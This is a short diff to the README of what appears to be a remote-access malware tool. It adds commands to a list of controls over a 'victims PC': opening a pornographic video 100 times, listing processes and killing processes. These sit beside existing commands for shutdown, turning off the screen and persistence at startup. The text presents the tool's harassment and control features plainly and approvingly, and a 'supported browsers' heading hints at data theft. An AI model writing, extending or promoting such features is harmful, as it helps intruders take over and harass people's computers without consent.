@@ -47,6 +47,9 @@ DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for 
 26. !shutdown -- Shutsdown PC
 27. !screenoff - Turns off the victims screen for 30 seconds
 28. !startup - ACTUALLY ADDS TO STARTUP.
+29. !goon -- Opens PornHub Video 100 times on victims PC
+30. !processes -- Shows processes with their PID
+31. !kill ( pid ) -- Kills proccess
 
 # SUPPORTED BROWSERS 
 
